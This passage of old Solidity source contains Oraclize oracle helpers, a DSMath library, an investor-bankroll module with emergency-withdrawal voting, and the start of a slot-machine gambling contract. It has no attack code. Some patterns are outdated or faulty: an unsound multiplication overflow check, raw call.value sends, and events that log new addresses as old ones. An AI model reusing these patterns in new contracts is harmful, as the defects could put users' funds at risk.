dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\npragma solidity ^0.4.10;\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x * y) >= x);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x * y) >= x);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract LedgerProofVerifyI {\n function external_oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) public;\n function external_oraclize_randomDS_proofVerify(bytes proof, bytes32 queryId, bytes result, string context_name) public returns (bool);\n}\ncontract Owned {\n address public owner;\n modifier onlyOwner {\n assert(msg.sender == owner);\n _;\n }\n function Owned() {\n owner = msg.sender;\n }\n}\ncontract oraclizeSettings is Owned {\n uint constant ORACLIZE_PER_SPIN_GAS_LIMIT = 6100;\n uint constant ORACLIZE_BASE_GAS_LIMIT = 200000;\n uint safeGas = 9000;\n event newGasLimit(uint _gasLimit);\n function setSafeGas(uint _gas)\n onlyOwner\n {\n assert(ORACLIZE_BASE_GAS_LIMIT + safeGas >= ORACLIZE_BASE_GAS_LIMIT);\n assert(safeGas <= 25000);\n safeGas = _gas;\n newGasLimit(_gas);\n }\n}\ncontract HouseManaged is Owned {\n address public houseAddress;\n bool public isStopped;\n event LOG_ContractStopped();\n event LOG_ContractResumed();\n event LOG_OwnerAddressChanged(address oldAddr, address newOwnerAddress);\n event LOG_HouseAddressChanged(address oldAddr, address newHouseAddress);\n modifier onlyIfNotStopped {\n assert(!isStopped);\n _;\n }\n modifier onlyIfStopped {\n assert(isStopped);\n _;\n }\n function HouseManaged() {\n houseAddress = msg.sender;\n }\n function stop_or_resume_Contract(bool _isStopped)\n onlyOwner {\n isStopped = _isStopped;\n }\n function changeHouse_and_Owner_Addresses(address newHouse, address newOwner)\n onlyOwner {\n assert(newHouse != address(0x0));\n assert(newOwner != address(0x0));\n owner = newOwner;\n LOG_OwnerAddressChanged(owner, newOwner);\n houseAddress = newHouse;\n LOG_HouseAddressChanged(houseAddress, newHouse);\n }\n}\ncontract usingInvestorsModule is HouseManaged, oraclizeSettings {\n uint constant MAX_INVESTORS = 5;\n uint constant divestFee = 50;\n struct Investor {\n address investorAddress;\n uint amountInvested;\n bool votedForEmergencyWithdrawal;\n }\n mapping(address => uint) public investorIDs;\n mapping(uint => Investor) public investors;\n uint public numInvestors = 0;\n uint public invested = 0;\n uint public investorsProfit = 0;\n uint public investorsLosses = 0;\n bool profitDistributed;\n event LOG_InvestorEntrance(address investor, uint amount);\n event LOG_InvestorCapitalUpdate(address investor, int amount);\n event LOG_InvestorExit(address investor, uint amount);\n event LOG_EmergencyAutoStop();\n event LOG_ZeroSend();\n event LOG_ValueIsTooBig();\n event LOG_FailedSend(address addr, uint value);\n event LOG_SuccessfulSend(address addr, uint value);\n modifier onlyMoreThanMinInvestment {\n assert(msg.value > getMinInvestment());\n _;\n }\n modifier onlyMoreThanZero {\n assert(msg.value != 0);\n _;\n }\n modifier onlyInvestors {\n assert(investorIDs[msg.sender] != 0);\n _;\n }\n modifier onlyNotInvestors {\n assert(investorIDs[msg.sender] == 0);\n _;\n }\n modifier investorsInvariant {\n _;\n assert(numInvestors <= MAX_INVESTORS);\n }\n modifier onlyIfProfitNotDistributed {\n if (!profitDistributed) {\n _;\n }\n }\n function getBankroll()\n constant\n returns(uint) {\n if ((invested < investorsProfit) ||\n (invested + investorsProfit < invested) ||\n (invested + investorsProfit < investorsLosses)) {\n return 0;\n }\n else {\n return invested + investorsProfit - investorsLosses;\n }\n }\n function getMinInvestment()\n constant\n returns(uint) {\n if (numInvestors == MAX_INVESTORS) {\n uint investorID = searchSmallestInvestor();\n return getBalance(investors[investorID].investorAddress);\n }\n else {\n return 0;\n }\n }\n function getLossesShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsLosses) / invested;\n }\n function getProfitShare(address currentInvestor)\n constant\n returns (uint) {\n return investors[investorIDs[currentInvestor]].amountInvested * (investorsProfit) / invested;\n }\n function getBalance(address currentInvestor)\n constant\n returns (uint) {\n uint invested = investors[investorIDs[currentInvestor]].amountInvested;\n uint profit = getProfitShare(currentInvestor);\n uint losses = getLossesShare(currentInvestor);\n if ((invested + profit < profit) ||\n (invested + profit < invested) ||\n (invested + profit < losses))\n return 0;\n else\n return invested + profit - losses;\n }\n function searchSmallestInvestor()\n constant\n returns(uint) {\n uint investorID = 1;\n for (uint i = 1; i <= numInvestors; i++) {\n if (getBalance(investors[i].investorAddress) < getBalance(investors[investorID].investorAddress)) {\n investorID = i;\n }\n }\n return investorID;\n }\n function addInvestorAtID(uint id)\n private {\n investorIDs[msg.sender] = id;\n investors[id].investorAddress = msg.sender;\n investors[id].amountInvested = msg.value;\n invested += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value);\n }\n function profitDistribution()\n private\n onlyIfProfitNotDistributed {\n uint copyInvested;\n for (uint i = 1; i <= numInvestors; i++) {\n address currentInvestor = investors[i].investorAddress;\n uint profitOfInvestor = getProfitShare(currentInvestor);\n uint lossesOfInvestor = getLossesShare(currentInvestor);\n if ((investors[i].amountInvested + profitOfInvestor >= investors[i].amountInvested) &&\n (investors[i].amountInvested + profitOfInvestor >= lossesOfInvestor)) {\n investors[i].amountInvested += profitOfInvestor - lossesOfInvestor;\n LOG_InvestorCapitalUpdate(currentInvestor, (int) (profitOfInvestor - lossesOfInvestor));\n }\n else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n if (copyInvested + investors[i].amountInvested >= copyInvested)\n copyInvested += investors[i].amountInvested;\n }\n delete investorsProfit;\n delete investorsLosses;\n invested = copyInvested;\n profitDistributed = true;\n }\n function increaseInvestment()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyInvestors {\n profitDistribution();\n investors[investorIDs[msg.sender]].amountInvested += msg.value;\n invested += msg.value;\n }\n function newInvestor()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyNotInvestors\n onlyMoreThanMinInvestment\n investorsInvariant {\n profitDistribution();\n if (numInvestors == MAX_INVESTORS) {\n uint smallestInvestorID = searchSmallestInvestor();\n divest(investors[smallestInvestorID].investorAddress);\n }\n numInvestors++;\n addInvestorAtID(numInvestors);\n }\n function divest()\n onlyInvestors {\n divest(msg.sender);\n }\n function divest(address currentInvestor)\n internal\n investorsInvariant {\n profitDistribution();\n uint currentID = investorIDs[currentInvestor];\n uint amountToReturn = getBalance(currentInvestor);\n if ((invested >= investors[currentID].amountInvested)) {\n invested -= investors[currentID].amountInvested;\n uint divestFeeAmount = (amountToReturn*divestFee)/10000;\n amountToReturn -= divestFeeAmount;\n delete investors[currentID];\n delete investorIDs[currentInvestor];\n if (currentID != numInvestors) {\n Investor lastInvestor = investors[numInvestors];\n investorIDs[lastInvestor.investorAddress] = currentID;\n investors[currentID] = lastInvestor;\n delete investors[numInvestors];\n }\n numInvestors--;\n safeSend(currentInvestor, amountToReturn);\n safeSend(houseAddress, divestFeeAmount);\n LOG_InvestorExit(currentInvestor, amountToReturn);\n } else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n }\n function forceDivestOfAllInvestors()\n onlyOwner {\n uint copyNumInvestors = numInvestors;\n for (uint i = 1; i <= copyNumInvestors; i++) {\n divest(investors[1].investorAddress);\n }\n }\n function safeSend(address addr, uint value)\n internal {\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n if (addr != houseAddress) {\n if (!(houseAddress.call.gas(safeGas).value(value)())) LOG_FailedSend(houseAddress, value);\n }\n }\n LOG_SuccessfulSend(addr,value);\n }\n}\ncontract EmergencyWithdrawalModule is usingInvestorsModule {\n uint constant EMERGENCY_WITHDRAWAL_RATIO = 80;\n uint constant EMERGENCY_TIMEOUT = 3 days;\n struct WithdrawalProposal {\n address toAddress;\n uint atTime;\n }\n WithdrawalProposal public proposedWithdrawal;\n event LOG_EmergencyWithdrawalProposed();\n event LOG_EmergencyWithdrawalFailed(address withdrawalAddress);\n event LOG_EmergencyWithdrawalSucceeded(address withdrawalAddress, uint amountWithdrawn);\n event LOG_EmergencyWithdrawalVote(address investor, bool vote);\n modifier onlyAfterProposed {\n assert(proposedWithdrawal.toAddress != 0);\n _;\n }\n modifier onlyIfEmergencyTimeOutHasPassed {\n assert(proposedWithdrawal.atTime + EMERGENCY_TIMEOUT <= now);\n _;\n }\n function voteEmergencyWithdrawal(bool vote)\n onlyInvestors\n onlyAfterProposed\n onlyIfStopped {\n investors[investorIDs[msg.sender]].votedForEmergencyWithdrawal = vote;\n LOG_EmergencyWithdrawalVote(msg.sender, vote);\n }\n function proposeEmergencyWithdrawal(address withdrawalAddress)\n onlyIfStopped\n onlyOwner {\n for (uint i = 1; i <= numInvestors; i++) {\n delete investors[i].votedForEmergencyWithdrawal;\n }\n proposedWithdrawal = WithdrawalProposal(withdrawalAddress, now);\n LOG_EmergencyWithdrawalProposed();\n }\n function executeEmergencyWithdrawal()\n onlyOwner\n onlyAfterProposed\n onlyIfStopped\n onlyIfEmergencyTimeOutHasPassed {\n uint numOfVotesInFavour;\n uint amountToWithdraw = this.balance;\n for (uint i = 1; i <= numInvestors; i++) {\n if (investors[i].votedForEmergencyWithdrawal == true) {\n numOfVotesInFavour++;\n delete investors[i].votedForEmergencyWithdrawal;\n }\n }\n if (numOfVotesInFavour >= EMERGENCY_WITHDRAWAL_RATIO * numInvestors / 100) {\n if (!proposedWithdrawal.toAddress.send(amountToWithdraw)) {\n LOG_EmergencyWithdrawalFailed(proposedWithdrawal.toAddress);\n }\n else {\n LOG_EmergencyWithdrawalSucceeded(proposedWithdrawal.toAddress, amountToWithdraw);\n }\n }\n else {\n revert();\n }\n }\n function forceDivestOfOneInvestor(address currentInvestor)\n onlyOwner\n onlyIfStopped {\n divest(currentInvestor);\n delete proposedWithdrawal;\n }\n}\ncontract Slot is usingOraclize, EmergencyWithdrawalModule, DSMath {\n uint constant INVESTORS_EDGE = 200;\n uint constant HOUSE_EDGE = 50;\n uint constant CAPITAL_RISK = 250;\n uint constant MAX_SPINS = 16;\n uint minBet = 1 wei;\n struct SpinsContainer {\n address playerAddress;\n uint nSpins;\n uint amountWagered;\n }\n mapping (bytes32 => SpinsContainer) spins;\n uint[] public probabilities;\n uint[] public multipliers;\n uint public totalAmountWagered;\n event LOG_newSpinsContainer(bytes32 myid, address playerAddress, uint amountWagered, uint nSpins);\n event LOG_SpinExecuted(bytes32 myid, address playerAddress, uint spinIndex, uint numberDrawn);\n event LOG_SpinsContainerInfo(bytes32 myid, address playerAddress, uint netPayout);\n LedgerProofVerifyI externalContract;\n function Slot(address _verifierAddr) {\n externalContract = LedgerProofVerifyI(_verifierAddr);\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n externalContract.external_oraclize_randomDS_setCommitment(queryId, commitment);\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n assert(externalContract.external_oraclize_randomDS_proofVerify(_proof, _queryId, bytes(_result), oraclize_getNetworkName()));\n _;\n }\n modifier onlyOraclize {\n assert(msg.sender == oraclize_cbAddress());\n _;\n }\n modifier onlyIfSpinsExist(bytes32 myid) {\n assert(spins[myid].playerAddress != address(0x0));\n _;\n }\n function isValidSize(uint _amountWagered)\n constant\n returns(bool) {\n uint netPotentialPayout = (_amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/ 10000;\n uint maxAllowedPayout = (CAPITAL_RISK 